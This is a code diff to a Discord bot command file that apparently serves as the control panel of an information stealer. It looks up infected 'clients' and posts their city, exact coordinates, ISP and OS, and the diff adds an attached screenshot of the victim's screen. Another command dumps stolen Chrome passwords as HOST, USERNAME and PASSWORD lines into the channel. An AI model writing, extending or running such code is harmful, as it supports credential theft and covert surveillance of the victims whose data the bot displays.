@@ -1,3 +1,4 @@
+const fs = require("fs");
 const Discord = require("discord.js");
 const paginationEmbed = require("discord.js-pagination");
 const db = require("../models");
@@ -55,10 +56,17 @@ exports.run = (client, message, args) => {
                 const element = results[0];
                 const chromeData = await db.Chrome.findAll({
                     where: {
-                        identifier: element.identifier
-                    }
+                        identifier: element.identifier,
+                    },
                 });
+                const screenshotData = await db.Screenshots.findAll({
+                    where: {
+                        identifier: element.identifier,
+                    },
+                });
+
                 const chromeLength = chromeData.length;
+                const screenShotPath = screenshotData[0].link;
 
                 const embed = new Discord.MessageEmbed()
                     .setColor("#0099ff")
@@ -70,9 +78,7 @@ exports.run = (client, message, args) => {
                             **Country**: ${element.country}
                             **Region**: ${element.region}
                             **City**: ${element.city}
-                            **Location**: https://www.google.com/maps/search/?api=1&query=${
-                                element.lat
-                            },${element.lon}
+                            **Location**: https://www.google.com/maps/search/?api=1&query=${element.lat},${element.lon}
                             **ISP**: ${element.isp}
                             **OS**: ${element.operatingSystem}
                             **Release**: ${element.release}
@@ -89,6 +95,18 @@ exports.run = (client, message, args) => {
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
                     )
                     .setTimestamp();
+
+                if (fs.existsSync(screenShotPath)) {
+                    console.log(1);
+                    const attachment = new Discord.MessageAttachment(
+                        screenShotPath,
+                        "screenshot.jpg"
+                    );
+
+                    embed
+                        .attachFiles(attachment)
+                        .setImage("attachment://screenshot.jpg");
+                }
 
                 message.channel.send(embed);
             } else {
@@ -112,13 +130,21 @@ exports.run = (client, message, args) => {
                 if (result.length > 0) {
                     db.Chrome.findAll({
                         where: {
-                            identifier: result[0].identifier
-                        }
+                            identifier: result[0].identifier,
+                        },
                     }).then((results) => {
                         if (results.length > 0) {
                             let output = "";
-                            results.forEach(element => {
-                                output = output + `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n====================================\n`;
+                            results.forEach((element, i) => {
+                                if (i == results.length - 1) {
+                                    output =
+                                        output +
+                                        `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n`;
+                                } else {
+                                    output =
+                                        output +
+                                        `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n====================================\n`;
+                                }
                             });
                             message.channel.send("```" + output + "```");
                         } else {
@@ -126,7 +152,7 @@ exports.run = (client, message, args) => {
                         }
                     });
                 } else {
-                    message.channel.send("Client not found")
+                    message.channel.send("Client not found");
                 }
             });
         }
